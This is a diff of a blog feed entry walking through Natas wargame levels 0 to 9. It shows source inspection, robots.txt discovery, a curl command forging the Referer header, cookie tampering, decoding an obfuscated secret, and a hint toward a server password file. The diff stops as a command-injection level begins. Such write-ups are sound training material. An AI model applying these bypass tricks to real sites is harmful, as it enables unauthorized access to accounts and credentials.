@@ -1,26 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh - Brute_Force</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/brute_force.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-10-16T06:01:00-04:00</updated><entry><title>Exploiting the Web in 20 Lessons (Natas)</title><link href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html" rel="alternate"></link><published>2014-10-16T06:01:00-04:00</published><updated>2014-10-16T06:01:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-16:/exploiting-the-web-in-20-lessons-natas.html</id><summary type="html">&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ihtJsdE.png"&gt;&lt;/p&gt;
-&lt;p&gt;Continuing my quest through the &lt;a href="http://overthewire.org/wargames/"&gt;Wargames&lt;/a&gt;, today I am going to talk about the 20 first levels of &lt;a href="http://overthewire.org/wargames/natas/"&gt;Natas&lt;/a&gt;, the &lt;strong&gt;web exploitation episode&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;I divide the exploits in two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ihtJsdE.png"&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/brute_force.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-10-16T06:01:00-04:00</updated><entry><title>Exploiting the Web in 20 Lessons (Natas)</title><link href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html" rel="alternate"></link><updated>2014-10-16T06:01:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-16:exploiting-the-web-in-20-lessons-natas.html</id><summary type="html">&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ihtJsdE.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Continuing my quest through the &lt;a href="http://overthewire.org/wargames/"&gt;Wargames&lt;/a&gt;, today I am going to talk about the 20 first levels of &lt;a href="http://overthewire.org/wargames/natas/"&gt;Natas&lt;/a&gt;, the &lt;strong&gt;web exploitation episode&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;I divide the exploits in two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part comprehends the challenges that do, with scripting, brute force, and all the fun stuff.&lt;/p&gt;
 &lt;p&gt;Let the game begin.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;No scripting required here, Dude!&lt;/h2&gt;
 &lt;h3&gt;Level 0 and 1: Simple source code inspection&lt;/h3&gt;
 &lt;p&gt;The first two levels starts with a simple HTML page. No hints.&lt;/p&gt;
 &lt;p&gt;Obviously, the first thing we do is ti take a look  at the source code.&lt;/p&gt;
 &lt;p&gt;In the 0th level, the password is straight from the there.&lt;/p&gt;
 &lt;p&gt;In the first level, we need to  disable  &lt;strong&gt;JavaScript&lt;/strong&gt; so you can right click it:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="na"&gt;oncontextmenu&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;javascript:alert(&amp;#39;right clicking has been blocked!&amp;#39;);return false;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;body&lt;/span&gt; &lt;span class="na"&gt;oncontextmenu=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;javascript:alert(&amp;#39;right clicking has been blocked!&amp;#39;);return false;&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Too easy.&lt;/p&gt;
 &lt;h3&gt;Level 2: Source code inspection for directories&lt;/h3&gt;
 &lt;p&gt;Looking at the source code in the second level reveals:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;There is nothing on this page
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;files/pixel.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;There is nothing on this page
+&lt;span class="nt"&gt;&amp;lt;img&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;files/pixel.png&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -32,7 +30,7 @@
 &lt;p&gt;gives a file &lt;code&gt;users.txt&lt;/code&gt; with the password.&lt;/p&gt;
 &lt;h3&gt;Level 3: Robots.txt&lt;/h3&gt;
 &lt;p&gt;Looking at the source code we see this comment:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;!-- No more information leaks!! Not even Google will find it this time... --&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;!--&lt;/span&gt; &lt;span class="n"&gt;No&lt;/span&gt; &lt;span class="n"&gt;more&lt;/span&gt; &lt;span class="n"&gt;information&lt;/span&gt; &lt;span class="n"&gt;leaks&lt;/span&gt;&lt;span class="o"&gt;!!&lt;/span&gt; &lt;span class="n"&gt;Not&lt;/span&gt; &lt;span class="n"&gt;even&lt;/span&gt; &lt;span class="n"&gt;Google&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;find&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -42,17 +40,17 @@
 &lt;p&gt;http://natas3.natas.labs.overthewire.org/robots.txt&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;We find:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;User-agent: *
-Disallow: /s3cr3t/
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="nl"&gt;Disallow:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s3cr3t&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Looking at the content of  the folder &lt;em&gt;/s3cr3t/&lt;/em&gt; revels:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Index of /s3cr3t
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Index&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s3cr3t&lt;/span&gt;
 
-[ICO]   Name    Last modified   Size    Description
-[DIR]   Parent Directory        -
-[TXT]   users.txt   12-Jul-2013 13:35   40
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ICO&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Name&lt;/span&gt;    &lt;span class="n"&gt;Last&lt;/span&gt; &lt;span class="n"&gt;modified&lt;/span&gt;   &lt;span class="n"&gt;Size&lt;/span&gt;    &lt;span class="n"&gt;Description&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;DIR&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Parent&lt;/span&gt; &lt;span class="n"&gt;Directory&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;   &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2013&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;   &lt;span class="mi"&gt;40&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -62,22 +60,22 @@ Disallow: /s3cr3t/
 &lt;/blockquote&gt;
 &lt;h3&gt;Level 4: Changing the referer tag&lt;/h3&gt;
 &lt;p&gt;In this level, the front page shows this message:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Access disallowed. You are visiting from &amp;quot;http://natas4.natas.labs.overthewire.org/index.php&amp;quot; while authorized users should come only from &amp;quot;http://natas5.natas.labs.overthewire.org/&amp;quot;
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;viewsource&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Refresh page&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Access disallowed. You are visiting from &amp;quot;http://natas4.natas.labs.overthewire.org/index.php&amp;quot; while authorized users should come only from &amp;quot;http://natas5.natas.labs.overthewire.org/&amp;quot;
+&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;viewsource&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Refresh page&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The server thinks we are coming from a page that is indicated in the &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/HTTP_referer"&gt;referer&lt;/a&gt;&lt;/strong&gt; tag in the headers.&lt;/p&gt;
 &lt;p&gt;The referer is a (historically misspelled) tag that carries the address of the URL that linked to the address we are requesting.&lt;/p&gt;
 &lt;p&gt;There are many ways to tamper this. While we could use browser plugins such as &lt;a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en"&gt;tampermonkey&lt;/a&gt; or &lt;a href="https://chrome.google.com/webstore/detail/modify-headers-for-google/innpjfdalfhpcoinfnehdnbkglpmogdi?hl=en-US"&gt;modify-headers&lt;/a&gt;, the good old &lt;strong&gt;curl&lt;/strong&gt; do it easily:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl --user natas4:************************ http://natas4.natas.labs.overthewire.org/index.php --referer &lt;span class="s2"&gt;&amp;quot;http://natas5.natas.labs.overthewire.org/&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;curl --user natas4:************************ http://natas4.natas.labs.overthewire.org/index.php --referer &lt;span class="s2"&gt;&amp;quot;http://natas5.natas.labs.overthewire.org/&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;Level 5: Tampering cookies&lt;/h3&gt;
 &lt;p&gt;When we log in the 5th level, the front page says:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Access disallowed. You are not logged in
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Access&lt;/span&gt; &lt;span class="n"&gt;disallowed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;logged&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -86,7 +84,7 @@ Disallow: /s3cr3t/
 &lt;p&gt;Using the &lt;a href="http://www.editthiscookie.com/start/"&gt;edit this cookie&lt;/a&gt; plugin we are able to edit it and get the next password.&lt;/p&gt;
 &lt;h3&gt;Level 6: Source code inspection for directories II&lt;/h3&gt;
 &lt;p&gt;This level comes with a PHP form. We take a look at the source code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class="k"&gt;include&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;includes/secret.inc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
@@ -112,14 +110,14 @@ Disallow: /s3cr3t/
 &lt;p&gt;Submitting this value in the input form gives us the password.&lt;/p&gt;
 &lt;h3&gt;Level 7: Modifying URLs&lt;/h3&gt;
 &lt;p&gt;This level has the following hint in its PHP source code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php?page=home&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Home&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php?page=about&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;About&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php?page=home&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Home&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php?page=about&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;About&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
 this is the front page
 &lt;span class="c"&gt;&amp;lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&amp;gt;&lt;/span&gt;
-&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -134,7 +132,7 @@ this is the front page
 &lt;/blockquote&gt;
 &lt;h3&gt;Level 8: String decoding&lt;/h3&gt;
 &lt;p&gt;This level comes with a PHP form, similar to the 6th level. We take a look at the code source:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class="nv"&gt;$encodedSecret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3d3d516343746d4d6d6c315669563362&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;encodeSecret&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$secret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strrev&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;base64_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$secret&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
@@ -153,32 +151,32 @@ this is the front page
 &lt;p&gt;Simple. The secret is  encoded in some obscuration. Funny enough, it uses the PHP function &lt;a href="http://php.net/manual/en/function.strrev.php"&gt;strrev&lt;/a&gt; to reverse the string.&lt;/p&gt;
 &lt;p&gt;We perform the following operations to recover the variable &lt;em&gt;$secret&lt;/em&gt; from the variable &lt;em&gt;$encodedSecret&lt;/em&gt;:&lt;/p&gt;
 &lt;p&gt;I - Decode hexadecimal to binary (&lt;em&gt;bin2hex&lt;/em&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="s1"&gt;&amp;#39;==QcCtmMml1ViV3b&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s"&gt;&amp;#39;==QcCtmMml1ViV3b&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;II - Reverse the string (&lt;em&gt;strrev&lt;/em&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="s1"&gt;&amp;#39;b3ViV1lmMmtCcQ==&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="s"&gt;&amp;#39;b3ViV1lmMmtCcQ==&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;III - Base64 decode (&lt;em&gt;base64_encode&lt;/em&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="s1"&gt;&amp;#39;oubWYf2kBq&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s"&gt;&amp;#39;oubWYf2kBq&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We submit this last string in the input form,  giving us the password.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;I'm bored. Can we do something actually cool?&lt;/h2&gt;
 &lt;p&gt;Yes, we can.&lt;/p&gt;
 &lt;h3&gt;Level 9: OS Command Injection&lt;/h3&gt;
 &lt;p&gt;This level's page has a search form. If we try to submit a word, for example &lt;em&gt;secret&lt;/em&gt;, we get several variations of this word:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ZQwlqsQl.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ZQwlqsQl.png" /&gt;&lt;/p&gt;
 &lt;p&gt;We inspect the source code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;natas9&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;natas9&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
 Find words containing: &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;needle&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;submit&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;submit&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;Search&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
@@ -186,13 +184,13 @@ Find words containing: &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;spa
 Output:
 &lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
-&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
